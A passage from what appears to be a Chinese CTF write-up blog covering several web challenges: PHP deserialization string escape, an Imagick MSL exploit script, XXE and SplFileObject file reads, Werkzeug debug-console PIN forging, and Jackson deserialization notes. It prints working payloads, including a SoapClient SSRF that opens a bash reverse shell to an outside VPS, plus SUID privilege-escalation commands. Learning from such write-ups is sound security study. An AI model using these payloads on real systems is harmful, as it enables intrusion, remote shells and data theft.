strlen('\";s:3:\"pwd');\n\n?>\n\n\n\n思路\n\n类不一样咋办？\n\n\n我知道是反序列化，但是我在做题的时候，没想明白这里序列化的是push_it，但是反序列化需要用到pull_it，这怎么办？\n\n\n可以逃逸啊\n\n\n\n由于a函数是字符变少的，所以一定是字符减少的反序列化，既然普通的属性可以逃逸，那也可以逃逸pull_it这个类\n\n\n如何构造字符**b**的数量？\n\n\n\n根据我的笔记，字符减少的反序列化需要把前面的闭合，也就是我需要知道这部分的长度\n\n\n\n看到上面的属性是private，就需要格外注意，url编码后输出是**%00类%00属性**，第一行没输出是因为**%00**是不可见字符\n这里可以把它当成空格，按照空格来计算字符长度，但是传值时要编码成**%00**\n计算下面字符串的长度，因为6b ---&gt;  4a，少2个字符，现在需要空出28个字符，所以b的长度应为\n\n28 / 2 * 6 = 84\nprint_r(strlen('\";s:12:\" push_it pwd\";s:47:\"'));\n\n//长度为28\n\n\n所以给root和pwd传值\n\nroot=bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb\n&amp;pwd=\";s:3:\"pwd\";O:7:\"pull_it\":1:&#123;s:1:\"x\";s:2:\"ls\";&#125;\n\n\n这里再传一个pwd是因为前面的pwd已经被包裹进去了，而push_it有两个属性，所以得加上。\n这里既可以只写pwd，也可以url编码后改为%00pull_it%00pwd，y4师傅的博客中说php7.1以上时对类属性不敏感，不写也可以正常输出\n\n\n\n反序列化时进行了正则匹配，需要绕过？\n\n\n\n无字母的webshell，上传数据包，用.配合通配符执行文件\n\n","slug":"巅峰极客","date":"2023-07-31T12:38:30.000Z","categories_index":"","tags_index":"CTF","author_index":"XyM4ster"},{"id":"78573adfdee442ddc082a9ef8f1c1600","title":"SCTF","content":"SCTF ezcheck1n思路\nhint提示：find the way to flag.Looks like there are two containers with an evil P in the configuration file of the frontend server\n前端服务器的配置文件中有 two containers with an evil P\n\nBoogipop师傅的wpCVE-2023-25690 Apache HTTP Server 请求走私漏洞 分析与利用 - 先知社区反向代理是一种代理模式，它充当Web服务器网关的代理服务器。当您将请求发送到使用反向代理的Web服务器时，他们将先转到反向代理，由该代理将确定是将其路由到哪个内部服务器。\n\n\n将以 &#x2F;hello&#x2F; 开头的 URL 请求转发到 http://10.122.255.252/index.php 地址，并把hello之后的内容作为参数，作为name的值\n\nSCTF fumo_backdoor思路\n\nsleep函数： 如果路径存在文件，且路径不包括flag，会readfile\n\n\nDockerfile 是用于构建 Docker 镜像的文本文件，其中包含了一系列指令和参数，用于描述如何构建镜像。\nDockerfile 中的指令可以用于定义所需的基础镜像、安装依赖、添加文件、执行命令等操作，最终生成一个可运行的 Docker 镜像。\n\n\n这里注意到安装了imagick扩展，于是就上Github上搜，但是我并没有搜到\n\nhttps://github.com/AFKL-CUIT/CTF-Challenges/blob/master/CISCN/2022/backdoor/writup/writup.md\n\n当对象被序列化时，会触发sleep，当对象反序列化时，会触发wake up\nsleep方法会读flag，但是这里有正则匹配，所以要把flag换个目录\nwakeip方法中可以执行无参的命令\n\n问题1：如何触发sleep\n\n当前情况下，只有**session**可以序列化\n\n也就是如果我往session里写了东西，改了session，web框架检测到**session**修改，就会触发session的序列化，让他重新保存。\n当你使用 PHP 中的 session 时，如果你往 session 中写入了数据，PHP 会将这些数据序列化为字符串，并将其存储在服务器上的某个位置（通常是文件系统上的某个位置，但也可以是其他位置，例如数据库中）。当客户端请求该 session 时，PHP 会将存储的字符串反序列化为原始数据\n问题2：那怎么改session呢？\n\n参考上面的github，也就是我进到wakeup里面去，让他new Imagick(&quot;vid:msl:/tmp/php*&quot;)，现在可以执行msl脚本了\n\n\n问题3：我怎么传一个**msl**脚本？\n\n直接上传一个文件，在末尾添加脏数据，php会把上传的文件保存在/tmp/phpxxxx目录下\n用户的session保存在/tmp目录下，以sess_(这部分是用户名)\n\n\n\n 标签用于读取一个文件，它的 filename 属性指定了要读取的文件的路径和名称。在这个示例中，这个文件是一个 BASE64 编码的图片文件，它的数据被嵌入在一个 data URI 中，通过 inline: 协议来指定。\n 标签用于将处理后的图像写入到一个文件中，它的 filename 属性指定了要写入的文件的路径和名称。在这个示例中，这个文件的路径为 &#x2F;tmp&#x2F;sess_RABBIT。\n从这个 MSL 脚本来看，它的目的是读取一个图片文件，进行一些图像处理操作，然后将处理后的图片保存到/tmp/sess_afkl中\n\n问题4：现在已经跑到sleep中了，但是不能直接读flag，咋办？\n\n再执行一次new imagick，把flag换个地方\n\n\n\n这里需要让flag通过图片校验，所以去找一个检查宽松的格式\n\nhttps://github.com/ImageMagick/ImageMagick/blob/main/www/formats.html  \n\n此时我把flag读到了/tmp/2333hhhh目录下\n反序列化执行wakeup，用我的cookiePHPSESSID=afkl去读flag\n\npy脚本注意这里上传文件的格式\n\n和之前学的一样，value中包括两个元组，第一个是文件名，第二个是内容\n最后携带自己的cookiePHPSESSID去访问网站\n\ncookies=&#123;&quot;PHPSESSID&quot;: session_id&#125;)\n\nClick to see more\nimport requests, base64, time\nSERVER_ADDR = \"http://182.92.6.230:18080/\"\ndef del_tempd():\n    resp = requests.post(SERVER_ADDR, data=&#123;\"cmd\":\"rm\"&#125;)\n    print(resp.status_code)\n\ndef write_file(xml: str):\n# Imagick(\"vid:msl:/tmp/php*\")\n    unserialize = base64.b64decode(b'TzoxMzoiZnVtb19iYWNrZG9vciI6NDp7czo0OiJwYXRoIjtOO3M6NDoiYXJndiI7YToxOntpOjA7czoxNzoidmlkOm1zbDovdG1wL3BocCoiO31zOjQ6ImZ1bmMiO047czo1OiJjbGFzcyI7czo3OiJJbWFnaWNrIjt9')\n    print(unserialize)\n    resp = requests.post(SERVER_ADDR,files=&#123;\"file\":(\"exec1.msl\",xml)&#125;,data=\n    &#123;\"cmd\":\"unserialze\",\"data\":unserialize&#125;)\n    print(resp.status_code)\n    \ndef show_phpinfo() -> None:\n    print(SERVER_ADDR + \"?cmd=unserialze&amp;data=O%3A13%3A%22fumo_backdoor%22%3A4%3A%7Bs%3A4%3A%22path%22%3BN%3Bs%3A4%3A%22argv%22%3Bs%3A14%3A%22vid%3Amsl%3A%2Ftmp%2Fa%22%3Bs%3A4%3A%22func%22%3Bs%3A7%3A%22phpinfo%22%3Bs%3A5%3A%22class%22%3Bs%3A7%3A%22Imagick%22%3B%7D\")\n\ndef get_new_php_session() -> str:\n    resp = requests.get(SERVER_ADDR + \"?cmd=unserialze&amp;data=O%3A13%3A%22fumo_backdoor%22%3A4%3A%7Bs%3A4%3A%22path%22%3BN%3Bs%3A4%3A%22argv%22%3Bs%3A14%3A%22vid%3Amsl%3A%2Ftmp%2Fa%22%3Bs%3A4%3A%22func%22%3Bs%3A13%3A%22session_start%22%3Bs%3A5%3A%22class%22%3Bs%3A7%3A%22Imagick%22%3B%7D\")\n    return resp.headers.get(\"Set-Cookie\")[10:42]\n\n\ndef session_start(session_id: str):\n    resp = requests.get(SERVER_ADDR + \"?cmd=unserialze&amp;data=O%3A13%3A%22fumo_backdoor%22%3A2%3A%7Bs%3A4%3A%22path%22%3Bs%3A8%3A%22%2Ftmp%2Fyyz%22%3Bs%3A4%3A%22func%22%3Bs%3A13%3A%22session_start%22%3B%7D\", cookies=&#123;\"PHPSESSID\": session_id&#125;)\n    print(resp.text)\n\ndel_tempd()\ntime.sleep(2)\n\nsession_id = get_new_php_session()\nprint(session_id)\ntime.sleep(2)\n\ndel_tempd()\ntime.sleep(2)\n\nxml = f'''&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?>\n&lt;group>\n&lt;image >\n &lt;read filename=\"mvg:/flag[20x20+20+20]\"!(\n!)image>\n&lt;write filename=\"mvg:/tmp/yyz\"!(\n!)group>\n'''\nxml2 = f'''&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?>\n&lt;group>\n&lt;image >\n&lt;read\nfilename=\"inline:data:text/8BIM;base64,eXl6fE86MTM6ImZ1bW9fYmFja2Rvb3IiOjI6e3M6NDoicGF0a\nCI7czo4OiIvdG1wL3l5eiI7czo0OiJmdW5jIjtzOjEzOiJzZXNzaW9uX3N0YXJ0Ijt9\"!(\n!)image>\n&lt;write filename=\"8BIM:/tmp/sess_&#123;session_id&#125;\"!(\n!)group>\n'''\n\nwrite_file(xml)\ntime.sleep(3)\n\nwrite_file(xml2)\ntime.sleep(3)\n\nsession_start(session_id)\n\n\n\nSCTF pypyp?\n首先提示，session not started，也就是需要开启session\n\nsession.upload_progress开启session文件包含骚姿势——利用session.upload_progress进行文件包含_noViC4的博客-CSDN博客\n&lt;?php\n// 检查文件是否上传成功\nif ($_FILES['file']['error'] > 0) &#123;\n\techo '文件上传失败：' . $_FILES['file']['error'];\n\texit;\n&#125;\n\necho \"aaaa\";\n\n?>\n\n&lt;html>\n&lt;body>\n&lt;form action=\"http://192.168.1.101/a.php\" method=\"POST\" enctype=\"multipart/form-data\">\n    &lt;input type=\"hidden\" name=\"PHP_SESSION_UPLOAD_PROGRESS\" value=\"1\" />\n    &lt;input type=\"file\" name=\"file\" />\n    &lt;input type=\"submit\" value=\"submit\" />\n&lt;/form>\n&lt;/body>\n&lt;/html>\n\n\n\n\n也就是我上传一个PHP_SESSION_UPLOAD_PROGRESS，同时带一个Cookie，就会让服务器开启session_start，创建一个session\n\n\n\n这长度竟然不一样，前面是----,后面是------\n\n\n\n会认为后面这个是post上传的数据，key是data\n在 HTTP 请求的消息体中，如果使用了 multipart&#x2F;form-data 格式，那么消息体中的每个部分都会使用 Content-Disposition 头来指定该部分的类型。如果部分是表单字段，那么 Content-Disposition 头的值通常为 form-data，并且会包含一个 name 属性来指定字段的名称。在这个例子中，Content-Disposition 头的值为 form-data; name&#x3D;”data”，其中 name&#x3D;”data” 表示这是一个名为 data 的表单字段。在 PHP 中，您可以通过访问 $_POST[‘data’] 来获取该字段的值。\n\n\nphp源码审计\nClick to see more\n&lt;?php\n    error_reporting(0);\n    if(!isset($_SESSION))&#123;\n        die('Session not started');\n    &#125;\n    highlight_file(__FILE__);\n    $type = $_SESSION['type'];\n    $properties = $_SESSION['properties'];\n    echo urlencode($_POST['data']);\n\n    extract(unserialize($_POST['data']));\n\n    if(is_string($properties)&amp;&amp;unserialize(urldecode($properties)))&#123;\n    $object = unserialize(urldecode($properties));\n    $object -> sctf();\n    exit();\n    &#125; else if(is_array($properties))&#123;\n        $object = new $type($properties[0],$properties[1]);\n    &#125; else &#123;\n        $object = file_get_contents('http://127.0.0.1:5000/'.$properties);\n    &#125;\n    echo \"this is the object: $object &lt;br>\";\n\n?>\n\n\n\n\n这里首先extract可以控制变量，$type和$properties都可以控制\n\nextract除了可以提取上传的参数，比如?properties&#x3D;aa，变成$properties&#x3D;aa\n\n也可以提取数组，array(“properties” &#x3D;&gt; “aa”,”type” &#x3D;&gt; “bb”)，这个也会变成$properties&#x3D;aa，$type&#x3D;bb\n\n$object -&gt; sctf()，但是这里显然是没有这个函数，因此可以想用soapclient进行ssrf\n\nfile_get_contents(‘http://127.0.0.1:5000/'.$properties))这个可以获取文件内容\n\n\n\n首先题目提示查看/app/app.py,那就需要想办法查看源码。\n\nnew $type($properties[0],$properties[1])，这个参数可以自己控制\nnew $type($properties[0],$properties[1])SimpleXMLElement：它可以实现xxe,xxe中用file协议读取文件，获得app.py的源码SplFileObject：支持伪协议读取文件，也就是可以用php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;&#x2F;app&#x2F;app.py，或者file协议读取文件\nSimpleXMLElement\n\n用php的内置类SimpleXMLElement\n\n&lt;?php\n\n$xml = &lt;&lt;&lt;EOD\n&lt;?xml version = \"1.0\"?>\n&lt;!DOCTYPE ANY [\n&lt;!ENTITY f SYSTEM \"file:///etc/passwd\">\n]>\n&lt;x>&amp;f;&lt;/x> \nEOD;\n//echo $xml;\n$arr=Array(\"properties\"=>Array($xml,2),\"type\"=>\"SimpleXMLElement\");\necho (serialize($arr));\n$obj=new SimpleXMLElement($xml,2);\n//echo $obj;\n?>\n\n\n&lt;&lt;&lt;EOD是多行字符串的意思，可以理解成python 中的&#96;&#96;&#96;&#96;&#96;\n这个2可以理解成固定的，如果输出$obj，就会运行上面的xml代码，也就是会读出etc/passwd的内容\n\n\nSplFileObject\n\n\n第一个参数可以是伪协议，第二个参数是r\n\n&lt;?php\n\n//echo $xml;\n$x = \"php://filter/read=convert.base64-encode/resource=/app/app.py\";\n$arr=Array(\"properties\"=>Array($x,'r'),\"type\"=>\"SplFileObject\");\necho (serialize($arr));\n#\n\n\n\n解码后得到源码\n\nfrom flask import Flask\n\napp = Flask(__name__)\n\n@app.route('/')\ndef index():\n    return 'Hello World!'\n\nif __name__ == '__main__':\n    app.run(host=\"0.0.0.0\",debug=True)\n\n\nflask开启了debug–&gt;pin码rce\n正常在本地运行一下环境，之后访问/console，输入正确的Pin码后，可以进入console，执行命令\n那如果我可以控制服务器的console，也就可以rce了\n首先用file_get_contents访问一下console\n\n\n\n本地测试\n\n\n发现访问时候的参数如下，因为我没法输入命令(都是在burp render看的回显)，所以我只能带着参数去访问\n\n\n\n发现是有cookie的\n\n那如何带着参数去访问呢？\n\n那就只能用**SoapClient**，因为上面有一个object-&gt;sctf，也就是会调用soapclient的call方法，也就是可以携带参数访问了\n\n\nflask算pin码\n\n\n网上有很多教程，首先我需要确定的是python的版本\n因为它没有报错，所以我不知道路径，只能看运气\n用GlobIterrator类配合glob伪协议去找每个可能一点的目录\nV&amp;N的wp中说用php的GlobIterrator类配合glob伪协议去找每个可能一点的目录，这个目前我还没实现\n我本地的目录是，算pin码的方法在__init__.py中\n\n\n\n这里就百度找吧，因为前一天我做了一个ctfshow的flask算pin码的，大致差不多\n也有的wp说访问/usr/lib/python3.8/LICENSE.txt，如果它存在，说明是python3.8\n最后__init__.py的位置在\n\n/usr/lib/python3.8/site-packages/werkzeug/debug/init.py\n算pin码的脚本\n\n直接翻源码\n\n\nClick to see more\nimport getpass\nimport hashlib\nimport json\nimport mimetypes\nimport os\nimport pkgutil\nimport re\nimport sys\nimport time\nimport typing as t\nimport uuid\nfrom itertools import chain\nfrom os.path import basename\nfrom os.path import join\ndef hash_pin(pin: str) -> str:\n    return hashlib.sha1(f\"&#123;pin&#125; added salt\".encode(\"utf-8\", \"replace\")).hexdigest()[:12]\ndef get_pin_and_cookie_name() :\n \n    rv = None\n    num = None\n    probably_public_bits = [\n        'app',\n        'flask.app',\n        'Flask',\n        '/usr/lib/python3.8/site-packages/flask/app.py'\n    ]\n\n    private_bits = [\n        '2485378023426', #  /sys/class/net/eth0/address 16进制转10进制\n        #machine_id由三个合并(docker就后两个)：1./etc/machine-id 2./proc/sys/kernel/random/boot_id 3./proc/self/cgroup\n        '349b3354-f67f-4438-b395-4fbc01171fdd96f7c71c69a673768993cd951fedeee8e33246ccc0513312f4c82152bf68c687'\n    ]\n\n\n    h = hashlib.sha1()\n    for bit in chain(probably_public_bits, private_bits):#使用 chain 函数可以方便地将多个可迭代对象合并成一个迭代器\n        if not bit:                                        #遍历其中的所有元素\n            continue\n        if isinstance(bit, str):#判断它是否为字符串类型\n            bit = bit.encode(\"utf-8\")\n        h.update(bit)\n    h.update(b\"cookiesalt\")\n\n    cookie_name = f\"__wzd&#123;h.hexdigest()[:20]&#125;\"\n\n    # If we need to generate a pin we salt it a bit more so that we don't\n    # end up with the same value and generate out 9 digits\n    if num is None:\n        h.update(b\"pinsalt\")\n        num = f\"&#123;int(h.hexdigest(), 16):09d&#125;\"[:9]\n\n    # Format the pincode in groups of digits for easier remembering if\n    # we don't have a result yet.\n    if rv is None:\n        for group_size in 5, 4, 3:\n            if len(num) % group_size == 0:\n                rv = \"-\".join(\n                    num[x : x + group_size].rjust(group_size, \"0\")\n                    for x in range(0, len(num), group_size)\n                )\n                break\n        else:\n            rv = num\n\n    cookie_value = f\"&#123;int(time.time())&#125;|&#123;hash_pin(rv)&#125;\",\n    print(cookie_value)\nget_pin_and_cookie_name() \n\n\n\n\n\n最后这个路径是/usr/lib/python3.8/site-packages/flask/app.py，我在本地输出的是下面这个，也就是找到前半部分，后面直接对应就行了\n\n\n\n通过xxe查看信息\n\n\n\n查看 /sys/class/net/eth0/address，用下面的代码转成10进制\n\n\nint('0242ac130002',16)#2485378023426\n\n\n下面是获取machine_id的源码，通常\n\n\n\ndocker没有第一个，只需要把后两个合起来就行了\n\nproc/sys/kernel/random/boot_id /proc/self/cgroup\n\n根据上面的代码，用/分开，且要最后一部分\n\n\n\n最后计算pin的脚本，cookie_value的算法参见__int__.py源码\n\n\nClick to see more\ndef hash_pin(pin: str) -> str:\n    return hashlib.sha1(f\"&#123;pin&#125; added salt\".encode(\"utf-8\", \"replace\")).hexdigest()[:12]\ndef get_pin_and_cookie_name() :\n \n    rv = None\n    num = None\n    probably_public_bits = [\n        'app',\n        'flask.app',\n        'Flask',\n        '/usr/lib/python3.8/site-packages/flask/app.py'\n    ]\n\n    private_bits = [\n        '2485378023426', #  /sys/class/net/eth0/address 16进制转10进制\n        #machine_id由三个合并(docker就后两个)：1./etc/machine-id 2./proc/sys/kernel/random/boot_id 3./proc/self/cgroup\n        '349b3354-f67f-4438-b395-4fbc01171fdd96f7c71c69a673768993cd951fedeee8e33246ccc0513312f4c82152bf68c687'\n    ]\n\n\n    h = hashlib.sha1()\n    for bit in chain(probably_public_bits, private_bits):#使用 chain 函数可以方便地将多个可迭代对象合并成一个迭代器\n        if not bit:                                        #遍历其中的所有元素\n            continue\n        if isinstance(bit, str):#判断它是否为字符串类型\n            bit = bit.encode(\"utf-8\")\n        h.update(bit)\n    h.update(b\"cookiesalt\")\n\n    cookie_name = f\"__wzd&#123;h.hexdigest()[:20]&#125;\"\n\n    # If we need to generate a pin we salt it a bit more so that we don't\n    # end up with the same value and generate out 9 digits\n    if num is None:\n        h.update(b\"pinsalt\")\n        num = f\"&#123;int(h.hexdigest(), 16):09d&#125;\"[:9]\n\n    # Format the pincode in groups of digits for easier remembering if\n    # we don't have a result yet.\n    if rv is None:\n        for group_size in 5, 4, 3:\n            if len(num) % group_size == 0:\n                rv = \"-\".join(\n                    num[x : x + group_size].rjust(group_size, \"0\")\n                    for x in range(0, len(num), group_size)\n                )\n                break\n        else:\n            rv = num\n\n    cookie_value = f\"&#123;int(time.time())&#125;|&#123;hash_pin(rv)&#125;\",\n    print(cookie_value)\nget_pin_and_cookie_name() \n\n\n\nsoapclient发包，反弹shell\n这里注意cmd中的参数要url编码，否则会有问题\nvps上开 nc -lvnp 7777,这里如果没有参数n，也会有问题\n\n$target = 'http://127.0.0.1:5000/console?&amp;__debugger__=yes&amp;cmd=__import__(%22os%22).popen(%22bash%20-c%20%5C%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F124.222.155.242%2F7777%20%3C%262%5C%22%22)&amp;frm=0&amp;s=DhOJxtvMXCtezvKtqaK9';\n$ua =\"xym4ster\\r\\nX-Forwarded-For: 127.0.0.1\\r\\nCookie: __wzdb2a60e2b19822632a67c=1688531875|11b8517fb9fb\";\n$b = new SoapClient(null,array(\n    'location' => $target,\n    'user_agent'=>$ua,\n    'uri'=> \"aaab\"));\n$arr=Array(\"properties\"=>urlencode(serialize($b)),\"type\"=>\"SimpleXMLElement\");\n$aaa = serialize($arr);\necho $aaa;\n\n\n\n\n反弹成功，但是查看flag，发现没有权限，需要提权\n\n\n关于反弹shell\n\n上面的命令是\n\nbash -c \\\"bash -i >&amp; /dev/tcp/124.222.155.242/7777 &lt;&amp;2\\\"\n\n\n-c 选项表示将后面的参数作为一个命令来执行\n-i相当于会启动一个交互式的bash shell\n所以要先bash -c 再bash -i\n\n命令的含义Linux 反弹shell（二）反弹shell的本质 - 先知社区\n\n\n\n\n\n\n\n\n\n\n&amp;表示把标准输出和标准错误输出 都输出到vps上，也就是1和2 都指向vps\n\n后面的 &lt;&amp;2 相当于 0&lt;&amp;2，表示把标准输入指针到标准错误输出，也就是0也指向2，0指向1也行\n\n\n\n\n\n首先\n\nsuid 提权 curl权限提升 | suid提权及修复方式-腾讯云开发者社区-腾讯云\n通常Linux系统文件及目录最常见的三种权限为：可读权限(r)，可写权限(w)和可执行权限(x)。有时我们会发现有些文件或者目录的所属主的权限会带s标识。当s这个标志出现在文件所有者的x权限上时，如&#x2F;usr&#x2F;bin&#x2F;passwd文件的权限状态：“-rwsr-xr-x.”，此时就被称为Set UID，简称为SUID权限。当一个可执行文件被设置了 s 权限时，在执行该程序时，它将会以该程序的所有者或所属组的身份运行。\n\n也就是如果我找到了一个有SUID权限且属主为root的，我就能用root的权限执行\n\nfind / -user root -perm -4000 -print 2>/dev/null\nfind / -perm -u=s -type f 2>/dev/null\nfind / -user root -perm -4000 -exec ls -ldb &#123;&#125; ;\n\n-perm 表示搜索随后的权限\n-u=s 表示查找root用户拥有的文件\n-type表示我们正在寻找的文件类型\nf 表示常规文件，而不是目录或特殊文件\n2 表示该进程的第二个文件描述符，即stderr（标准错误）\n> 表示重定向\n/dev/null 是一个特殊的文件系统对象，它将丢弃写入其中的所有内容\n\n\n\n发现有curl，直接curl file:///flag\n\n\nSCTF hellojavajava8、java11环境配置JDK 8 和JDK11双环境配置_别卷了球球了的博客-CSDN博客\n\n先安装jdk11，再安装jdk8(但是我觉得这个顺序不重要，只要把下面的文件删了就行)\n\n\n\n要把这个文件夹里面存在的文件都删掉(java.exe)啥的，不让cmd打开的优先级比我自己设置的优先级高\n配置环境变量\n\n\n\n把D:\\jdk-11\\bin目录下的java.exe改成java11.exe\n此时输入java -version，系统默认是jdk1.8，输入java11 -version是java11\n\n\njar包反编译\n给个jar包，用idea的插件java decompiler反编译\n在jar包所在的文件夹，打开cmd\n\njava -cp \"D:\\idea\\IntelliJ IDEA 2021.1.3\\plugins\\java-decompiler\\lib\\java-decompiler.jar\" org.jetbrains.java.decompiler.main.decompiler.ConsoleDecompiler -dgs=true sctf.jar test\n\n\n中间双引号的是插件路径(换成自己的)，true后面第一个参数是jar包的名字,第二个参数是反编译后文件存放的位置，这里要新建一个test文件夹\n反编译成功之后，还是一个jar包，用jar命令解压\n\njar -xvf sctf.jar\n\n\n\n函数的作用是循环处理键\n\n整个代码的含义\nClick to see more\nprotected Object _deserializeUsingPropertyBased(final JsonParser p, final DeserializationContext ctxt)\n       throws IOException\n   &#123;\n       final PropertyBasedCreator creator = _propertyBasedCreator;\n    //这里获取标注@JsonCreator的构造函数\n       PropertyValueBuffer buffer = creator.startBuilding(p, ctxt, _objectIdReader);\n       TokenBuffer unknown = null;\n       final Class&lt;?> activeView = _needViewProcesing ? ctxt.getActiveView() : null;\n\n       JsonToken t = p.currentToken();\n    //currentToken() 方法的作用是返回当前解析器所读取的 JSON 标记\n       List&lt;BeanReferring> referrings = null;\n       for (; t == JsonToken.FIELD_NAME; t = p.nextToken()) &#123;\n           String propName = p.currentName();\n           p.nextToken(); // to point to value\n           final SettableBeanProperty creatorProp = creator.findCreatorProperty(propName);\n           /* \n           反序列化 JSON 字符串时，\n           Jackson 会使用 SettableBeanProperty 对象来访问和设置 Java 对象的属性\n           这行代码用于查找 PropertyBasedCreator 对象中是否存在与当前 JSON 字段名字 propName \n           匹配的 SettableBeanProperty 属性\n           也就是找类中有没有映射的属性\n           */\n           if (buffer.readIdProperty(propName) &amp;&amp; creatorProp == null) &#123;\n               continue;\n           &#125;\n           // creator property?\n           if (creatorProp != null) &#123;\n               // Last creator property to set?\n               Object value;\n               if ((activeView != null) &amp;&amp; !creatorProp.visibleInView(activeView)) &#123;\n                   p.skipChildren();\n                   continue;\n               &#125;\n               value = _deserializeWithErrorWrapping(p, ctxt, creatorProp);\n               //对属性值反序列化\n               if (buffer.assignParameter(creatorProp, value)) &#123;\n                   p.nextToken(); // to move to following FIELD_NAME/END_OBJECT\n                   Object bean;\n                   try &#123;\n                       bean = creator.build(ctxt, buffer);\n                   &#125; catch (Exception e) &#123;\n                       bean = wrapInstantiationProblem(e, ctxt);\n                   &#125;\n                   if (bean == null) &#123;\n                       return ctxt.handleInstantiationProblem(handledType(), null,\n                               _creatorReturnedNullException());\n                   &#125;\n                   // [databind#631]: Assign current value, to be accessible by custom serializers\n                   p.setCurrentValue(bean);\n\n                   //  polymorphic?\n                   if (bean.getClass() != _beanType.getRawClass()) &#123;\n                       return handlePolymorphic(p, ctxt, bean, unknown);\n                   &#125;\n                   if (unknown != null) &#123; // nope, just extra unknown stuff...\n                       bean = handleUnknownProperties(ctxt, bean, unknown);\n                   &#125;\n                   // or just clean?\n                   return deserialize(p, ctxt, bean);\n               &#125;\n               continue;\n           &#125;\n           // regular property? needs buffering\n           SettableBeanProperty prop = _beanProperties.find(propName);\n           if (prop != null) &#123;\n               try &#123;\n                   buffer.bufferProperty(prop, _deserializeWithErrorWrapping(p, ctxt, prop));\n               &#125; catch (UnresolvedForwardReference reference) &#123;\n                   // 14-Jun-2016, tatu: As per [databind#1261], looks like we need additional\n                   //    handling of forward references here. Not exactly sure why existing\n                   //    facilities did not cover, but this does appear to solve the problem\n                   BeanReferring referring = handleUnresolvedReference(ctxt,\n                           prop, buffer, reference);\n                   if (referrings == null) &#123;\n                       referrings = new ArrayList&lt;BeanReferring>();\n                   &#125;\n                   referrings.add(referring);\n               &#125;\n               continue;\n           &#125;\n           // Things marked as ignorable should not be passed to any setter\n           if (IgnorePropertiesUtil.shouldIgnore(propName, _ignorableProps, _includableProps)) &#123;\n               handleIgnoredProperty(p, ctxt, handledType(), propName);\n               continue;\n           &#125;\n           // \"any property\"?\n           if (_anySetter != null) &#123;\n               try &#123;\n                   buffer.bufferAnyProperty(_anySetter, propName, _anySetter.deserialize(p, ctxt));\n               &#125; catch (Exception e) &#123;\n                   wrapAndThrow(e, _beanType.getRawClass(), propName, ctxt);\n               &#125;\n               continue;\n           &#125;\n\n           // 29-Mar-2021, tatu: [databind#3082] May skip collection if we know\n           //    they'd just get ignored (note: any-setter handled above; unwrapped\n           //    properties also separately handled)\n           if (_ignoreAllUnknown) &#123;\n               // 22-Aug-2021, tatu: [databind#3252] must ensure we do skip the whole value\n               p.skipChildren();\n               continue;\n           &#125;\n           // Ok then, let's collect the whole field; name and value\n           if (unknown == null) &#123;\n               unknown = ctxt.bufferForInputBuffering(p);\n           &#125;\n           unknown.writeFieldName(propName);\n           unknown.copyCurrentStructure(p);\n       &#125;\n\n       // We hit END_OBJECT, so:\n       Object bean;\n       try &#123;\n           bean = creator.build(ctxt, buffer);\n       &#125; catch (Exception e) &#123;\n           wrapInstantiationProblem(e, ctxt);\n           bean = null; // never gets here\n       &#125;\n       // 13-Apr-2020, tatu: [databind#2678] need to handle injection here\n       if (_injectables != null) &#123;\n           injectValues(ctxt, bean);\n       &#125;\n\n       if (referrings != null) &#123;\n           for (BeanReferring referring : referrings) &#123;\n              referring.setBean(bean);\n           &#125;\n       &#125;\n       if (unknown != null) &#123;\n           // polymorphic?\n           if (bean.getClass() != _beanType.getRawClass()) &#123; // lgtm [java/dereferenced-value-may-be-null]\n               return handlePolymorphic(null, ctxt, bean, unknown);\n           &#125;\n           // no, just some extra unknown properties\n           return handleUnknownProperties(ctxt, bean, unknown);\n       &#125;\n       return bean;\n   &#125;\n\n\n\n  此时value&#x3D;true\n\n这里会根据属性值构造对象\n具体来说，createFromObjectWith() 方法的作用是使用给定的值来创建 Java 对象的实例，并返回创建好的对象。如果创建过程中出现了异常，则会抛出相应的异常。\n\n\n\n这里的newInstance，就是在调用下面这个类，对属性进行赋值\n\n\n最最最关键的点\n\n代码执行到这行的时候，因为isadmin并没有指定映射，所以他认为是&quot;&quot;\n\n\n\n所以在执行findCreatorProperty的时候，是有返回值的\n\n\n\n因此，creatorProp不是null，会跳过if，从而有了后面的赋值，如果我把json中的&quot;&quot;改为aa，那么creatorProp == null，因此就不会赋值\n\n\n生成payload“yes” 是一个Linux和Unix操作系统上的命令行工具，它会不断地输出指定的字符串或者默认的 “y” 字符串（表示 “yes”），直到被强制终止。这个命令通常用于自动化脚本中，以便在需要用户交互时自动回答 “yes”。\n例如，如果你运行以下命令：\nyes\n\n它将会不断输出 “y” 字符串，直到你使用 “Ctrl + C” 组合键强制终止。\n你还可以在 “yes” 命令后面指定一个字符串作为参数，以便输出指定的字符串。例如，如果你想输出 “hello” 字符串，你可以运行以下命令：\nyes hello\n\n这将会不断输出 “hello” 字符串，直到你使用 “Ctrl + C” 组合键强制终止。\nmaven在github上下载的项目，直接并不能运行，也不能看到源码，需要添加maven的支持，并导入scala的依赖\nscala依赖\n&lt;dependencies>\n    &lt;!-- scala -->\n    &lt;dependency>\n        &lt;groupId>org.scala-lang&lt;/groupId>\n        &lt;artifactId>scala-library&lt;/artifactId>\n        &lt;version>2.13.9&lt;/version>\n    &lt;/dependency>\n\n&lt;/dependencies>\n\n\n我添加了一个Maven依赖，并且在add framework support中加了scala，然后我download sources，此时就不提示sources not dound了\n此时看到了正常的scala源码\n\n反编译的源码\n如果想用idea自带的反编译，看反编译后的java源码\n\n\n\n那就在这里加了scala SDK \n然后在scala源码中查找对应的类\n\n\nidea问题：从Github上下载的项目即使有main也不能直接运行，为啥？\n是因为没有标记为sources root，idea就不会对其添加运行代码相关的配置\n\n“Sources Root”（源码根目录）：将目录标记为项目的源代码目录。\n\n“Test Sources Root”（测试源码根目录）：将目录标记为项目的测试代码目录。\n\n“Resources Root”（资源根目录）：将目录标记为项目的资源文件目录，如配置文件、图像等。\n\n“Excluded”（排除目录）：将目录从项目的构建和搜索范围中排除。\n\n\n\n格式化代码CTRL+ alt + L\nSCTF an4er_monitor http.d.ts 文件中，socketPath?: string | undefined; 是用于描述 http.request() 和 https.request() 方法的参数 options 中的 socketPath 字段。\n具体解释如下：\nsocketPath 是一个可选的字符串类型字段，表示要使用的 Unix 套接字路径。它用于在发起 HTTP 或 